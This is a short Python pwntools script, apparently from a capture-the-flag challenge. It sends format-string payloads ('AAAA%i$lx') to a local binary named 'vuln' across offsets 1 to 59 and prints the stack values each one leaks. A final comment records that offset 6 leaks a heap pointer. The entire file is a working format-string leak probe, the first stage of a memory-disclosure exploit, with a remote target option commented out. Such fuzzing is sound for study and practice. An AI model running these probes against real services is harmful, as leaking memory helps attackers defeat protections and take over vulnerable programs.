#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'warn'
host, port = '', 1337


# =========================================================
#                           FUZZ
# =========================================================

for i in range(1, 60):
    try:
        # io = remote(host, port)
        io = process(exe)
        io.sendline(f'AAAA%{i}$lx'.encode())
    
        leak = io.recv()
        print(f'stack at-{i}' + ": " + str(leak[4:]))

        io.close()
    except EOFError:
        io.close()

# stack at-6: buffer heap pointer